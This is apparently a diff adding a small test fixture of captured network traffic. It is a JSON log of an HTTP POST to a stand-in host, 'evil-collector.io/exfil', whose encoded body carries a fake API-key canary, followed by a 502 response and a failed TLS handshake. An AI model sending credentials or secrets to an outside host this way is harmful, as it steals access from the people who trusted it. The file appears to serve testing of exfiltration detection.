@@ -1,0 +1,3 @@
+{"kind": "http_request", "host": "evil-collector.io", "port": 443, "method": "POST", "path": "/exfil", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Host": "evil-collector.io"}, "body_base64": "QU5USFJPUElDX0FQSV9LRVk9c2stYW50LXN0b2xlbi1zZWNyZXQtbWFya2Vy", "body_truncated": false, "timestamp": 1785506963.912248}
+{"kind": "http_response", "host": "evil-collector.io", "status_code": 502, "body_base64": "", "body_truncated": false, "timestamp": 1785506963.998}
+{"kind": "tls_handshake_failed", "sni": "pinned-host.example", "reason": "connection closed", "timestamp": 1785506964.1}
